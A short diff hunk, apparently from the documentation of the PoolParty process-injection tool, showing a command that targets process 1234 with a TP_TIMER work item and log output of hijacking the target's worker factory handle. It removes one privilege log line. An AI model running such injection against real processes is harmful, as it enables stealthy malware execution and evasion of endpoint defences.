@@ -26,7 +26,6 @@ Insert TP_TIMER work item to process ID 1234
 ```
 >> PoolParty.exe -V 8 -P 1234
 
-[info]    Retrieved SeDebugPrivilege successfully
 [info]    Starting PoolParty attack against process id: 1234
 [info]    Retrieved handle to the target process: 00000000000000B8
 [info]    Hijacked worker factory handle from the target process: 0000000000000058
